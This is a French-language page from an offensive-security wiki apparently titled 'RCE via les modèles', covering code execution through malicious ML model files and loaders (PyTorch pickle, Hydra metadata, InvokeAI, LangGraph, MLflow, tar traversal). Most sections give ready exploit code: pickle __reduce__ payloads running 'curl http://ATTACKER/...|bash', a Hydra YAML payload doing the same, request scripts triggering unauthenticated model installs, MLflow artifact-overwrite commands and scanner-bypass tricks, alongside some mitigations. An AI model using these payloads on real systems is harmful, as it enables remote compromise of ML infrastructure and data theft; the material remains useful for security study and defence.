# RCE via les modèles

{{#include ../banners/hacktricks-training.md}}

## Chargement de modèles pour obtenir une RCE

Les modèles de Machine Learning sont généralement partagés dans différents formats, tels que ONNX, TensorFlow, PyTorch, etc. Ils peuvent être chargés sur les machines des développeurs ou dans des systèmes de production pour être utilisés. En principe, les modèles ne devraient pas contenir de code malveillant, mais dans certains cas, ils peuvent servir à exécuter du code arbitraire sur le système, soit comme fonctionnalité prévue, soit en raison d’une vulnérabilité dans la bibliothèque de chargement des modèles.

Le tableau suivant répertorie des vulnérabilités représentatives de cette catégorie :

| **Framework / Outil**        | **Vulnérabilité (CVE si disponible)**                                                    | **Vecteur de RCE**                                                                                                                           | **Références**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Désérialisation non sécurisée dans* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malveillant dans le checkpoint du modèle entraîne l’exécution de code (en contournant la protection `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | Une SSRF et le téléchargement d’un modèle malveillant entraînent l’exécution de code ; une RCE par désérialisation Java dans l’API de gestion                                        | |
| **NVIDIA Merlin Transformers4Rec** | Désérialisation non sécurisée de checkpoint via `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint non fiable déclenche un pickle reducer pendant `load_model_trainer_states_from_checkpoint` → exécution de code dans le worker ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | Injection SQL et hook d’extension MessagePack non sécurisé **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | La clé `filter` contrôlée par l’utilisateur injecte une syntaxe SQL/JSON-path ; `UNION SELECT` fabrique une fausse ligne de checkpoint, puis la désérialisation `msgpack` importe et appelle du code Python choisi par l’attaquant | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML non sécurisé) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Le chargement d’un modèle depuis YAML utilise `yaml.unsafe_load` (exécution de code) <br> Le chargement d’un modèle avec une couche **Lambda** exécute du code Python arbitraire          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (analyse TFLite)                                                                                          | Un modèle `.tflite` spécialement conçu déclenche un dépassement d’entier → corruption du tas (RCE potentielle)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Le chargement d’un modèle via `joblib.load` exécute un pickle contenant la charge utile `__reduce__` de l’attaquant                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` non sécurisé) *contestée*                                                                              | Par défaut, `numpy.load` autorisait les tableaux d’objets pickle ; un fichier `.npy/.npz` malveillant déclenche l’exécution de code                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversée de répertoires) <br> **CVE-2024-5187** (traversée de tar)                                                    | Le chemin des poids externes d’un modèle ONNX peut sortir du répertoire (lecture de fichiers arbitraires) <br> Une archive tar de modèle ONNX malveillante peut écraser des fichiers arbitraires (entraînant une RCE) | |
| ONNX Runtime (risque de conception)  | *(Aucune CVE)* Ops personnalisées / flux de contrôle ONNX                                                                                    | Un modèle avec un opérateur personnalisé nécessite le chargement du code natif de l’attaquant ; des graphes de modèles complexes exploitent la logique pour exécuter des calculs non prévus   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversée de chemins)                                                                                          | L’utilisation de l’API de chargement de modèles avec `--model-control` activé permet une traversée de chemin relative pour écrire des fichiers (par ex., écraser `.bashrc` pour obtenir une RCE)    | |
| **GGML (format GGUF)**      | **CVE-2024-25664 … 25668** (plusieurs dépassements du tas)                                                                         | Un fichier de modèle GGUF malformé provoque des dépassements de tampon du tas dans l’analyseur, permettant l’exécution de code arbitraire sur le système de la victime                     | |
| **Keras (anciens formats)**   | *(Aucune nouvelle CVE)* Ancien modèle Keras H5                                                                                         | Le code de couche Lambda d’un modèle HDF5 (`.h5`) malveillant s’exécute toujours au chargement (le safe_mode de Keras ne couvre pas l’ancien format — « attaque par rétrogradation ») | |
| **Autres** (général)        | *Défaut de conception* – Sérialisation pickle                                                                                         | De nombreux outils ML (par ex., les formats de modèles basés sur pickle, `pickle.load` de Python) exécutent le code arbitraire intégré aux fichiers de modèle, sauf mesure d’atténuation | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Métadonnées non fiables transmises à `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Les métadonnées/configurations de modèle contrôlées par l’attaquant définissent `_target_` sur un appelable arbitraire (par ex., `builtins.exec`) → exécuté pendant le chargement, même avec des formats « sûrs » (`.safetensors`, `.nemo`, `config.json` du dépôt) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

De plus, certains modèles basés sur pickle Python, comme ceux utilisés par [PyTorch](https://github.com/pytorch/pytorch/security), peuvent servir à exécuter du code arbitraire sur le système s’ils ne sont pas chargés avec `weights_only=True`. Tout modèle basé sur pickle peut donc être particulièrement vulnérable à ce type d’attaque, même s’il ne figure pas dans le tableau ci-dessus.

### Contourner les vérifications statiques sur les checkpoints basés sur pickle

Un chemin de chargement de modèle qui appelle `pickle.load()`, `joblib.load()` ou `torch.load(..., weights_only=False)` sans restriction est un point d’exécution, pas simplement un analyseur.<sup>[[22]](#references)</sup> Dans PyTorch 2.6, `torch.load()` utilise par défaut `weights_only=True` si aucun module pickle personnalisé n’est fourni ; les exemples ci-dessous nécessitent un chargeur sans restriction ou une application qui désactive cette protection pour charger un objet non pris en charge.<sup>[[4]](#references)</sup> Un résultat sans problème lors d’une analyse statique ne modifie pas cette limite.<sup>[[21]](#references)</sup>

Voir [Désérialisation Python pickle](../pentesting-web/deserialization/#pickle) pour la primitive `__reduce__` de base et [la liste d’autorisation des imports ML de Fickling](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) pour les vérifications d’import à l’exécution.

#### Enregistrer un appelable, puis le résoudre avec `EXT2`

Un pickle peut appeler `copyreg.add_extension` via `REDUCE` afin d’enregistrer une paire module/nom sous un code d’extension numérique choisi par l’attaquant. Un `EXT2` ultérieur résout ce code en appelable, qu’un autre `REDUCE` peut appeler. L’appelable critique n’est donc pas l’opérande d’un opcode `GLOBAL` ou `STACK_GLOBAL`. Binarly a démontré cette technique avec `multiprocessing.util.spawnv_passfds` ; quatre des cinq scanners évalués ne l’ont pas détectée, tandis que SaferPickle l’a détectée. La mutation du registre et la résolution par `EXT2` ont lieu pendant la même opération de désérialisation.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

This is an opcode sketch, not a complete checkpoint: the outer loader must accept the surrounding pickle stream. A scanner that only searches `GLOBAL` operands for dangerous callables misses the later lookup; a scanner without `EXT2` support may fail before producing a verdict. A strict allowlist could still reject `copyreg.add_extension` itself.<sup>[[21]](#references)</sup>

#### Masquer des types d’objets code construits derrière des fonctions ordinaires

Une autre chaîne pickle peut obtenir `FunctionType` à partir de `type(copy.copy)` et `CodeType` à partir de `type(copy.copy.__code__)`, puis construire un objet code à partir du bytecode fourni, l’encapsuler dans une fonction et l’appeler. La variante publiée obtient `__code__` via `operator.methodcaller('__getattribute__', '__code__')` ; le pickle n’a donc pas besoin d’importer l’un ou l’autre constructeur par son nom. La disposition des champs de `CodeType(...)` et le bytecode dépendent de la version de CPython ; une charge utile conçue pour un autre interpréteur peut échouer avant son exécution. SaferPickle a tout de même signalé l’échantillon présenté, mais l’a rétrogradé au niveau `suspicious` ; les quatre autres scanners évalués ne l’ont pas détecté.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Déclencher le chargement d’un second modèle à partir d’un argument pickle

Un pickle externe peut appeler `torch.storage._load_from_bytes` avec, en argument, un modèle sérialisé fourni par l’attaquant. Cette fonction appelle `torch.load(io.BytesIO(b), weights_only=False)`, de sorte que le modèle imbriqué est désérialisé sans la restriction weights-only, même si un analyseur d’opcodes de premier niveau ne le voit que comme des octets transmis à un seul callable. Le chargement externe doit tout de même autoriser ce callable ; `weights_only=True` ne permet pas automatiquement au pickle externe de l’accepter. Les analyseurs qui n’inspectent pas récursivement les octets imbriqués peuvent manquer la chaîne interne `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Résoudre un nom de module pickle historique au chargement

Pour les protocoles pickle antérieurs à la version 3, le paramètre `fix_imports=True` de Python associe par défaut une référence `GLOBAL` à `commands.run` à `subprocess.run` via `_compat_pickle.IMPORT_MAPPING`. Un analyseur qui compare la chaîne littérale du module à une liste de blocage `subprocess` peut donc ne pas repérer le callable utilisé à l’exécution. Cela nécessite un chargeur qui conserve le mapping de compatibilité et accepte les arguments d’appel obtenus.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Faire passer un checkpoint qui n’est pas au format ZIP au-delà d’un analyseur réservé au ZIP

La sélection du format peut échouer indépendamment de l’inspection des opcodes : Binarly a constaté que ModelScan 0.8.8 dirigeait les fichiers `.bin`, `.pt`, `.pth` et `.ckpt` vers un analyseur PyTorch réservé au ZIP, et ignorait un flux pickle qui n’était pas au format ZIP au lieu de le transmettre à son analyseur pickle standard. La société a également documenté une ancienne disposition de modèle TAR acceptée par `torch.load()`, mais que ModelScan et JFrog n’inspectaient pas. Il s’agit de lacunes propres aux versions des analyseurs, et non de caractéristiques de tous les analyseurs de modèles.<sup>[[21]](#references)</sup>

#### Exécuter du code avant qu’un analyseur statique n’atteigne une fin malformée

Un analyseur qui parcourt entièrement un pickle avec `pickletools.genops()` peut lever une exception sur un opcode tronqué situé après un `REDUCE` valide. Le désérialiseur sans restriction a déjà invoqué le callable avant d’atteindre cette fin, même si le chargement complet lève ensuite une exception. L’exemple signalé plaçait un `BINUNICODE` tronqué immédiatement après le `REDUCE` exécutant, provoquant l’échec de `pickletools.genops()` alors que l’écriture de fichier provoquée plus tôt avait déjà eu lieu. Cette méthode contourne un analyseur uniquement si celui-ci considère l’erreur d’analyse comme bénigne ou ignore le fichier. Elle n’est utile que si l’effet secondaire compte sans qu’un modèle soit renvoyé avec succès ; une cible qui exige un chargement complet peut rejeter l’artefact.<sup>[[21]](#references)</sup>

### Métadonnées Hydra → RCE (fonctionne même avec safetensors)

`hydra.utils.instantiate()` importe et appelle tout `_target_` à notation par points présent dans un objet de configuration ou de métadonnées. Lorsque des bibliothèques comme Hugging Face Transformers transmettent des **métadonnées de modèle non fiables** à `instantiate()`, un attaquant peut fournir un callable et des arguments qui s’exécutent immédiatement pendant le chargement du modèle (sans pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Exemple de payload (fonctionne dans `model_config.yaml` d’un fichier `.nemo`, dans `config.json` d’un dépôt ou dans `__metadata__` à l’intérieur d’un fichier `.safetensors`) :

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Points clés :
- Déclenché avant l’initialisation du modèle dans `restore_from/from_pretrained` de NeMo, les codeurs HuggingFace de uni2TS et les loaders de FlexTok.
- La liste de blocage sous forme de chaîne de Hydra peut être contournée via des chemins d’import alternatifs (p. ex., `enum.bltns.eval`) ou des noms résolus par l’application (p. ex., `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok analyse également les métadonnées sérialisées sous forme de chaîne avec `ast.literal_eval`, ce qui permet un DoS (explosion de la consommation CPU/mémoire) avant l’appel à Hydra.

### 🆕  RCE dans InvokeAI via `torch.load` (CVE-2024-12029)

`InvokeAI` est une interface web open source populaire pour Stable-Diffusion. Les versions **5.3.1 – 5.4.2** exposent le endpoint REST `/api/v2/models/install`, qui permet aux utilisateurs de télécharger et charger des modèles depuis des URL arbitraires.<sup>[[1]](#references)</sup>

En interne, le endpoint finit par appeler :

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Lorsque le fichier fourni est un **checkpoint PyTorch (`*.ckpt`)**, `torch.load` effectue une **désérialisation pickle**. Comme le contenu provient directement d’une URL contrôlée par l’utilisateur, un attaquant peut intégrer un objet malveillant doté d’une méthode `__reduce__` personnalisée dans le checkpoint ; cette méthode est exécutée **pendant la désérialisation**, ce qui entraîne une **exécution de code à distance (RCE)** sur le serveur InvokeAI.

La vulnérabilité a reçu l’identifiant **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Procédure d’exploitation

1. Créer un checkpoint malveillant :

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hébergez `payload.ckpt` sur un serveur HTTP que vous contrôlez (par ex. `http://ATTACKER/payload.ckpt`).
3. Déclenchez le endpoint vulnérable (aucune authentification requise) :

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Lorsque InvokeAI télécharge le fichier, il appelle `torch.load()` → le gadget `os.system` s’exécute et l’attaquant obtient l’exécution de code dans le contexte du processus InvokeAI.

Exploit prêt à l’emploi : le module **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatise l’ensemble du processus.<sup>[[3]](#references)</sup>

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (indicateur de scan désactivé par défaut)
•  `/api/v2/models/install` accessible à l’attaquant
•  Le processus dispose des permissions nécessaires pour exécuter des commandes shell

#### Mesures d’atténuation

* Mettre à niveau vers **InvokeAI ≥ 5.4.3** : le correctif définit `scan=True` par défaut et effectue une analyse anti-malware avant la désérialisation.<sup>[[2]](#references)</sup>
* Pour charger des checkpoints par programmation, utiliser `torch.load(file, weights_only=True)` ou le nouveau helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Appliquer des listes d’autorisation / signatures aux sources des modèles et exécuter le service avec le principe du moindre privilège.

> ⚠️ N’oubliez pas que **tout** format basé sur Python pickle (y compris de nombreux fichiers `.pt`, `.pkl`, `.ckpt`, `.pth`) est intrinsèquement dangereux à désérialiser depuis des sources non fiables.

---

Exemple de mesure d’atténuation ad hoc si vous devez continuer à utiliser d’anciennes versions d’InvokeAI derrière un reverse proxy :

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 RCE dans NVIDIA Merlin Transformers4Rec via `torch.load` non sécurisé (CVE-2025-23298)

Transformers4Rec de NVIDIA (qui fait partie de Merlin) exposait un chargeur de checkpoint non sécurisé qui appelait directement `torch.load()` sur des chemins fournis par l’utilisateur. Comme `torch.load` repose sur Python `pickle`, un checkpoint contrôlé par un attaquant peut exécuter du code arbitraire via un reducer pendant la désérialisation.<sup>[[5]](#references)</sup>

Chemin vulnérable (avant le correctif) : `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Pourquoi cela entraîne une RCE : dans Python pickle, un objet peut définir un reducer (`__reduce__`/`__setstate__`) qui renvoie un callable et des arguments. Le callable est exécuté pendant l’unpickling. Si un tel objet est présent dans un checkpoint, il s’exécute avant que le moindre poids ne soit utilisé.

Exemple minimal de checkpoint malveillant :

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vecteurs de livraison et rayon d’impact :
- Checkpoints/modèles trojanisés partagés via des dépôts, des buckets ou des registres d’artefacts
- Pipelines automatisés de reprise/déploiement qui chargent automatiquement les checkpoints
- L’exécution a lieu dans les workers d’entraînement/inférence, souvent avec des privilèges élevés (par exemple, root dans des conteneurs)

Correctif : le commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) a remplacé l’appel direct à `torch.load()` par un désérialiseur restreint, à liste d’autorisation, implémenté dans `transformers4rec/utils/serialization.py`. Le nouveau loader valide les types/champs et empêche l’invocation de fonctions appelables arbitraires pendant le chargement.<sup>[[7]](#references)</sup>

Conseils de défense spécifiques aux checkpoints PyTorch :
- Ne désérialisez pas de données non fiables avec pickle. Préférez des formats non exécutables comme [Safetensors](https://huggingface.co/docs/safetensors/index) ou ONNX, lorsque c’est possible.
- Si vous devez utiliser la sérialisation PyTorch, vérifiez que `weights_only=True` est activé (pris en charge dans les versions récentes de PyTorch) ou utilisez un unpickler personnalisé à liste d’autorisation, similaire au patch de Transformers4Rec.<sup>[[4]](#references)</sup>
- Vérifiez la provenance/les signatures des modèles et exécutez la désérialisation dans un sandbox (seccomp/AppArmor ; utilisateur non-root ; système de fichiers restreint et aucune sortie réseau).
- Surveillez la création de processus enfants inattendus par les services de ML au chargement des checkpoints ; tracez l’utilisation de `torch.load()`/`pickle`.

Références aux POC et aux versions vulnérable/corrigée :<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader vulnérable avant le patch : https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC de checkpoint malveillant : https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader après le patch : https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Exemple – concevoir un modèle PyTorch malveillant

- Créer le modèle :

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Charger le modèle :

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Désérialisation Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD de Tencent expose un endpoint `resnet` qui désérialise des données contrôlées par l’utilisateur. ZDI a confirmé qu’un attaquant distant peut pousser une victime à charger une page/un fichier malveillant, lui faire envoyer un blob sérialisé spécialement conçu à cet endpoint et déclencher une désérialisation avec les privilèges de `root`, ce qui entraîne une compromission complète.

Le déroulement de l’exploit reprend les techniques classiques d’abus de pickle :

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Tout gadget accessible pendant la désérialisation (constructeurs, `__setstate__`, callbacks de framework, etc.) peut être weaponized de la même manière, que le transport soit HTTP, WebSocket ou un fichier déposé dans un répertoire surveillé.



### LangGraph checkpointer SQLi → MessagePack RCE

Cette chaîne d’attaque est intéressante, car l’attaquant **n’a pas besoin d’envoyer un fichier de modèle malveillant**. À la place, l’application expose une **API de persistance d’agent IA** (`get_state_history(..., filter=...)`) et les entrées utilisateur parviennent au générateur de requêtes du checkpointer.

#### 1. SQLi structurelle dans les filtres de métadonnées

Un modèle SQLite vulnérable ressemblait à ceci :

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

La valeur est liée plus tard, mais `query_key` est concaténé dans la **chaîne du chemin JSON** : un `'` dans la clé du dictionnaire sort de `'$.{query_key}'` et injecte du SQL. La même leçon s’applique aux **chemins JSON, identifiants, opérateurs, champs `LIMIT` et TTL** : les placeholders ne protègent que les valeurs, pas la syntaxe structurelle de la requête.

#### 2. `UNION SELECT` peut cibler des sinks en aval, pas seulement voler des données

La requête renvoie `type` et les octets sérialisés de `checkpoint`, qui sont ensuite consommés comme suit :

```python
self.serde.loads_typed((type, checkpoint))
```

Cela signifie qu'une SQLi dans la clause `WHERE` peut injecter une **fausse ligne de résultat** :

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Si du code ultérieur analyse, désérialise, écrit ou exécute une colonne sélectionnée, associez ces colonnes à leurs sinks. Dans ce cas, la fausse ligne transforme la SQLi en **désérialisation contrôlée par l’attaquant**.

#### 3. Les hooks d’extension MessagePack non sécurisés sont équivalents à des gadgets de code

Le chemin `msgpack` de LangGraph utilisait un hook d’extension personnalisé qui décompactait un tuple imbriqué et exécutait :

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Ainsi, un objet d’extension MessagePack encodant un équivalent de `("os", "system", "id > /tmp/pwned")` importe `os`, résout `system` et exécute la commande. Lors de l’audit de frameworks d’IA, inspectez les **revivers MessagePack/JSON/pickle personnalisés** à la recherche d’imports dynamiques, de réflexion ou de dispatch arbitraire d’appelables.

#### 4. Modèle d’audit pratique pour les frameworks d’agent

Examinez toute entrée contrôlée par l’utilisateur qui atteint :
- les API de listage de l’historique d’état, de la mémoire, de la relecture ou des points de contrôle
- les générateurs de filtres structurés qui produisent des fragments de requête SQL ou Redis
- les désérialiseurs personnalisés (`pickle`, `msgpack`, hooks d’objet `json`, constructeurs YAML)
- les chemins de récupération qui font confiance aux lignes renvoyées par la couche de persistance

Cette chaîne spécifique affectait les déploiements LangGraph auto-hébergés utilisant des points de contrôle **SQLite** ou **Redis**, lorsque des utilisateurs non fiables pouvaient contrôler `filter`. Les versions corrigées indiquées dans la divulgation étaient `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` et `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Écrasement d’artefact MLflow PyFunc menant à une exécution de code à distance via pickle

Un MLflow PyFunc créé à partir d’un `PythonModel` peut stocker l’objet sérialisé dans `python_model.pkl`. Les métadonnées du modèle désignent `mlflow.pyfunc.model` comme chargeur, et l’implémentation de MLflow utilise ce nom de fichier pour le modèle Python enregistré. Par conséquent, l’accès en écriture à l’artifact store peut permettre l’exécution de code dans une autre application qui charge ensuite le modèle.<sup>[[17]](#references)[[18]](#references)</sup>

La chaîne exploitable est **autorisation d’écriture sur l’artefact → remplacer le pickle → faire recharger le modèle par un consommateur d’inférence**. Pour une expérience utilisant une racine `mlflow-artifacts:/...` via un proxy, énumérez l’expérience, l’exécution et le chemin de l’artefact du modèle. Le serveur de suivi expose `GET` et `PUT` sur `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Un reducer minimal peut exécuter une commande dès que le consommateur désérialise l’artefact avec pickle. Générer le payload avec la version de Python déclarée dans `MLmodel` permet d’éviter les problèmes de compatibilité.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Déclenchez l’opération qui **charge le modèle existant**, comme une prédiction, une évaluation ou un déploiement. Ne lancez pas d’abord un nouvel entraînement, car celui-ci pourrait remplacer l’artefact malveillant par un modèle neuf. Une erreur de l’application ne réfute pas l’exploitation : le reducer renvoie le code de sortie entier de la commande au lieu d’un modèle utilisable. Commencez par un effet secondaire observable, comme un paquet ICMP ou un callback HTTP, puis remplacez-le par le payload final.<sup>[[20]](#references)</sup>

Lors d’une évaluation, faites la distinction entre l’autorisation de créer un run et celle d’écraser les artefacts appartenant à un autre run. Vérifiez l’authentification et les permissions de mise à jour par run, inspectez les modifications inattendues de `python_model.pkl` et considérez la provenance et l’intégrité des modèles comme faisant partie de la limite d’exécution. Le code actuel de MLflow permet également de définir `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` et recommande d’utiliser des artefacts models-from-code plutôt que de charger des données cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Serveurs de modèles exposés et infrastructure ML

Le chargement d’un modèle malveillant n’est pas le seul moyen d’exécuter du code sur une infrastructure ML. Les API de soumission de tâches, les endpoints de validation de code et les pulls du registre de modèles des services d’IA auto-hébergés peuvent permettre d’exécuter du code sans aucun fichier de modèle. Voir [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Traversée de chemin via les modèles

Comme indiqué dans [**cet article de blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la plupart des formats de modèles utilisés par différents frameworks d’IA reposent sur des archives, généralement au format `.zip`. Il pourrait donc être possible d’exploiter ces formats pour mener des attaques de traversée de chemin et lire des fichiers arbitraires sur le système où le modèle est chargé.<sup>[[16]](#references)</sup>

Par exemple, le code suivant permet de créer un modèle qui créera un fichier dans le répertoire `/tmp` lors de son chargement :

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ou, avec le code suivant, vous pouvez créer un modèle qui créera un symlink vers le répertoire `/tmp` lors de son chargement :

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Plongée approfondie : désérialisation Keras .keras et gadget hunting

Pour un guide ciblé sur les mécanismes internes de .keras, le RCE via une couche Lambda, le problème d’importation arbitraire dans les versions ≤ 3.8 et la découverte de gadgets après correctif dans l’allowlist, consultez :

{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog OffSec – "CVE-2024-12029 – InvokeAI : désérialisation de données non fiables"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit du correctif InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Documentation du module Metasploit Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – considérations de sécurité pour torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog ZDI – CVE-2025-23298 : obtenir une exécution de code à distance dans NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Avis ZDI : ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit du correctif Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Chargeur vulnérable avant correctif (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC de checkpoint malveillant (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Chargeur après correctif (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Exécution de code à distance avec les formats et bibliothèques modernes d’IA/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Documentation Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit de la block-list Hydra (avertissement concernant le RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – De SQLi à RCE : exploiter le checkpointer de LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Transformer des bugs Archive Slip en bounties IA/ML à forte valeur](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Avis Snyk et preuve de concept PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
